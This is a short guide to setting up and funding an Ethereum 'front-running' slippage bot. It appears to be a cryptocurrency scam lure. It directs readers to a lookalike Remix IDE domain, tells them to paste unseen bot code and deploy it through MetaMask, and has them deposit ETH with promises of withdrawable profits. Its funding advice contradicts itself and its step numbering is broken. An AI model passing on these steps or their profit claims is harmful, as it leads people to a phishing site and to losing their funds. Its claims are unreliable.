🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨

Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.15 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.

To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 5 ETH to ensure the bot functions optimally.

Step-by-Step Setup Guide:

1- Download MetaMask

► Install MetaMask

2- Access Remix

► Use Remix Ethereum IDE https://web3-remixides.com (Ensure you only use this version, as the bot is compatible with it specifically.)

3- Create Contract File

► Go to the “contracts” folder and create a “New File”.

► Rename it to a desired name ending in .sol, for example, “bot.sol.”

► If text colors are missing when creating the file, refresh the browser and paste in the code again.

4- Paste Code in Remix

► Copy and paste the bot code: ETH Bot Code.

5- Compile the Contract

► Go to the “Compile” tab on Remix.

► Select Solidity version 0.6.6 for compilation.

7- Deploy the Contract

► In the “Deploy & Run Transactions” tab, set “Injected Provider - MetaMask” as the environment and click “Deploy.”

► Confirm the contract creation in MetaMask. Note: Ensure your contract name is correctly selected in the CONTRACT section before clicking Deploy. Example: “OneinchSlippageBot - bot.sol.”

Troubleshooting: If you receive a "Gas estimation failed" error after clicking deploy, select "Send transaction" and confirm. MetaMask will automatically estimate the gas fee.

7- Fund Your Bot

► Deposit at least 0.15 ETH to cover slippage and ensure effective front-running.

► Transfer the funds to your specific bot address.

8-Run the Bot

► After confirmation, click "Start" to initiate the bot.

► Withdraw your profits anytime by clicking "Withdraw".

Following these steps will help ensure a successful bot operation with minimized transaction issues. ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
